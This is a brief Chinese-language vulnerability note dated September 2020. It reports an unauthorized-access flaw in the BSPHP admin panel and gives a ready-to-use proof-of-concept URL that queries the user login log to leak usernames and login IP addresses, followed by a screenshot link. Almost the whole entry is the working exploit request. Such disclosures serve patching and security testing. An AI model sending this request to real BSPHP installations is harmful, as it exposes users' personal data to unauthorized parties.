# BSPHP存在未授权访问

> 2020.9

## #Poc

泄漏用户名和登陆ip

```
http://x.x.x.x/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0
```

![image.png](https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxy7g3qc8j30u00v60we.jpg)